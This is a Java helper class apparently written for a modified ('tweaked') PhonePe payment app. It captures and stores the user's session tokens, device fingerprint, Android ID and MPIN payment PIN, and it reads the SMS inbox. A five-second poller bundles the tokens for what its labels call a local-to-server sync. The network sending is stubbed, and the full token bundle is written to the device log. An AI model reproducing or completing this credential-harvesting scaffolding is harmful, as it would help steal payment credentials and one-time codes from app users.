package com.PhonePeTweak.Def;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public final class PhonePeHelper {
    public enum TokenSyncResult {
        LOCAL_TO_SERVER,
        SERVER_TO_LOCAL,
        NO_CHANGE,
        ERROR
    }

    public interface ResultCallback {
        void onResult(boolean ok, String message);
    }

    private static final String TAG = "PPHelper";
    private static final String PREFS_NAME = "pph_store";

    private static final String KEY_USER_PHONE = "user_phone";
    private static final String KEY_X_DEVICE_FP = "x_device_fp";

    private static final String KEY_TOKEN_1FA = "token_1fa";
    private static final String KEY_TOKEN_SSO = "token_sso";
    private static final String KEY_TOKEN_AUTH = "token_auth";
    private static final String KEY_TOKEN_ACCOUNTS = "token_accounts";

    private static final String KEY_SENT_1FA = "sent_1fa";
    private static final String KEY_SENT_SSO = "sent_sso";
    private static final String KEY_SENT_AUTH = "sent_auth";
    private static final String KEY_SENT_ACCOUNTS = "sent_accounts";

    private static final String KEY_LAST_MPIN = "last_mpin";

    private static volatile Context appContext;
    private static volatile SharedPreferences prefs;
    private static volatile ScheduledExecutorService phoneNumberMonitor;

    private PhonePeHelper() {}

    public static synchronized void init(Context context) {
        if (context == null) {
            return;
        }
        if (appContext != null) {
            return;
        }
        appContext = context.getApplicationContext();
        prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        Log.i(TAG, "PhonePeHelper.init ok");
    }

    public static Context getContext() {
        return appContext;
    }

    public static void setUserPhoneNum(String phoneNumber) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (phoneNumber == null) {
            phoneNumber = "";
        }
        prefs.edit().putString(KEY_USER_PHONE, phoneNumber).apply();
    }

    public static String getUserPhoneNum() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_USER_PHONE, "");
    }

    public static String readUserPhoneNum() {
        return getUserPhoneNum();
    }

    public static void setX_Device_Fingerprint(String fingerprint) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (fingerprint == null) {
            fingerprint = "";
        }
        prefs.edit().putString(KEY_X_DEVICE_FP, fingerprint).apply();
    }

    public static String getDeviceFingerPrint() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_X_DEVICE_FP, "");
    }

    public static JSONObject get1faToken() {
        return readJson(KEY_TOKEN_1FA);
    }

    public static JSONObject getSSOToken() {
        return readJson(KEY_TOKEN_SSO);
    }

    public static JSONObject getAuthToken() {
        return readJson(KEY_TOKEN_AUTH);
    }

    public static JSONObject getAccountsToken() {
        return readJson(KEY_TOKEN_ACCOUNTS);
    }

    public static boolean set1faToken(JSONObject json) {
        return writeJson(KEY_TOKEN_1FA, json);
    }

    public static boolean saveSSOToken(JSONObject json) {
        return writeJson(KEY_TOKEN_SSO, json);
    }

    public static boolean saveSSOToken(Object tokenObj, int reason) {
        return writeJson(KEY_TOKEN_SSO, wrapObject(tokenObj, reason));
    }

    public static boolean saveAuthToken(JSONObject json) {
        return writeJson(KEY_TOKEN_AUTH, json);
    }

    public static boolean saveAccountsToken(JSONObject json) {
        return writeJson(KEY_TOKEN_ACCOUNTS, json);
    }

    public static boolean saveAccountsToken(Object tokenObj) {
        return writeJson(KEY_TOKEN_ACCOUNTS, wrapObject(tokenObj, 0));
    }

    public static JSONArray getUPIs() {
        JSONArray arr = new JSONArray();
        return arr;
    }

    public static JSONObject buildUPIInfo(String account, String accountNum, JSONArray vpas) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("account", account == null ? "" : account);
            obj.put("accountNum", accountNum == null ? "" : accountNum);
            obj.put("appType", "phonepe");
            obj.put("upis", vpas == null ? new JSONArray() : vpas);
        } catch (JSONException e) {
            Log.w(TAG, "buildUPIInfo failed", e);
        }
        return obj;
    }

    public static JSONObject getRequestMetaInfoObj() {
        JSONObject obj = new JSONObject();
        try {
            obj.put("package", appContext == null ? "" : appContext.getPackageName());
            obj.put("userPhone", getUserPhoneNum());
            obj.put("androidId", getAndroidId());
            obj.put("device", Build.MODEL);
            obj.put("brand", Build.BRAND);
            obj.put("xDeviceFingerprint", getDeviceFingerPrint());
            JSONObject tokens = new JSONObject();
            tokens.put("1fa", get1faToken());
            tokens.put("sso", getSSOToken());
            tokens.put("auth", getAuthToken());
            tokens.put("accounts", getAccountsToken());
            obj.put("tokens", tokens);
        } catch (JSONException e) {
            Log.w(TAG, "getRequestMetaInfoObj failed", e);
        }
        return obj;
    }

    public static String getRequestMetaInfo() {
        return getRequestMetaInfoObj().toString();
    }

    public static String getUPIRequestMetaInfo() {
        return getRequestMetaInfoObj().toString();
    }

    public static void startPhoneNumberMonitoring() {
        ensurePrefs();
        if (phoneNumberMonitor != null) {
            return;
        }
        phoneNumberMonitor = Executors.newSingleThreadScheduledExecutor();
        phoneNumberMonitor.scheduleAtFixedRate(new Runnable() {
            private String lastPhone = getUserPhoneNum();

            @Override
            public void run() {
                String current = getUserPhoneNum();
                if (!TextUtils.equals(lastPhone, current)) {
                    lastPhone = current;
                    Log.i(TAG, "phone changed: " + current);
                }
                publishTokenUpdateIfNeeded(false);
            }
        }, 5, 5, TimeUnit.SECONDS);
    }

    public static void stopPhoneNumberMonitoring() {
        if (phoneNumberMonitor != null) {
            phoneNumberMonitor.shutdownNow();
            phoneNumberMonitor = null;
        }
    }

    public static boolean publishTokenUpdateIfNeeded(boolean force) {
        if (prefs == null) {
            return false;
        }
        String v1 = stringify(get1faToken());
        String v2 = stringify(getSSOToken());
        String v3 = stringify(getAuthToken());
        String v4 = stringify(getAccountsToken());

        boolean changed = force
                || !TextUtils.equals(v1, prefs.getString(KEY_SENT_1FA, ""))
                || !TextUtils.equals(v2, prefs.getString(KEY_SENT_SSO, ""))
                || !TextUtils.equals(v3, prefs.getString(KEY_SENT_AUTH, ""))
                || !TextUtils.equals(v4, prefs.getString(KEY_SENT_ACCOUNTS, ""));

        if (!changed) {
            return false;
        }

        prefs.edit()
                .putString(KEY_SENT_1FA, v1)
                .putString(KEY_SENT_SSO, v2)
                .putString(KEY_SENT_AUTH, v3)
                .putString(KEY_SENT_ACCOUNTS, v4)
                .apply();

        Log.i(TAG, "publishTokenUpdateIfNeeded: changed=" + changed);
        Log.i(TAG, "meta=" + getRequestMetaInfo());
        return true;
    }

    public static TokenSyncResult performTokenSync() {
        if (appContext == null) {
            return TokenSyncResult.ERROR;
        }
        boolean updated = publishTokenUpdateIfNeeded(false);
        return updated ? TokenSyncResult.LOCAL_TO_SERVER : TokenSyncResult.NO_CHANGE;
    }

    public static void PublishMPIN(String mpin) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (mpin == null) {
            mpin = "";
        }
        prefs.edit().putString(KEY_LAST_MPIN, mpin).apply();
        Log.i(TAG, "PublishMPIN: length=" + mpin.length());
    }

    public static String getLastMpin() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_LAST_MPIN, "");
    }

    public static void readRecentSms() {
        if (appContext == null) {
            return;
        }
        try {
            ContentResolver resolver = appContext.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = resolver.query(uri, new String[]{"_id", "date", "address"}, null, null, "date DESC");
            if (cursor == null) {
                Log.w(TAG, "readRecentSms: cursor null");
                return;
            }
            int count = 0;
            while (cursor.moveToNext() && count < 3) {
                long id = cursor.getLong(0);
                long date = cursor.getLong(1);
                String address = cursor.getString(2);
                Log.i(TAG, "sms id=" + id + " date=" + formatDate(date) + " from=" + address);
                count++;
            }
            cursor.close();
        } catch (Throwable t) {
            Log.w(TAG, "readRecentSms failed", t);
        }
    }

    public static void performDataSyncBackup() {
        Log.i(TAG, "performDataSyncBackup: noop");
    }

    public static void refreshToken(ResultCallback callback) {
        if (callback != null) {
            callback.onResult(true, "ok");
        }
    }

    private static void ensurePrefs() {
        if (appContext == null) {
            return;
        }
        if (prefs == null) {
            prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        }
    }

    private static JSONObject readJson(String key) {
        ensurePrefs();
        if (prefs == null) {
            return new JSONObject();
        }
        String raw = prefs.getString(key, "");
        if (TextUtils.isEmpty(raw)) {
            return new JSONObject();
        }
        try {
            return new JSONObject(raw);
        } catch (JSONException e) {
            Log.w(TAG, "readJson failed: " + key, e);
            return new JSONObject();
        }
    }

    private static boolean writeJson(String key, JSONObject json) {
        ensurePrefs();
        if (prefs == null) {
            return false;
        }
        if (json == null) {
            json = new JSONObject();
        }
        prefs.edit().putString(key, json.toString()).apply();
        return true;
    }

    private static JSONObject wrapObject(Object obj, int reason) {
        JSONObject json = new JSONObject();
        try {
            json.put("raw", String.valueOf(obj));
            json.put("reason", reason);
        } catch (JSONException e) {
            Log.w(TAG, "wrapObject failed", e);
        }
        return json;
    }

    private static String stringify(JSONObject obj) {
        return obj == null ? "" : obj.toString();
    }

    private static String getAndroidId() {
        if (appContext == null) {
            return "";
        }
        try {
            String id = Settings.Secure.getString(appContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            return id == null ? "" : id;
        } catch (Throwable t) {
            return "";
        }
    }

    private static String formatDate(long time) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(time));
        } catch (Throwable t) {
            return String.valueOf(time);
        }
    }

    public static void logLong(String tag, String msg) {
        if (msg == null) {
            return;
        }
        int max = 3000;
        int len = msg.length();
        int start = 0;
        while (start < len) {
            int end = Math.min(start + max, len);
            Log.i(tag, msg.substring(start, end));
            start = end;
        }
    }
}
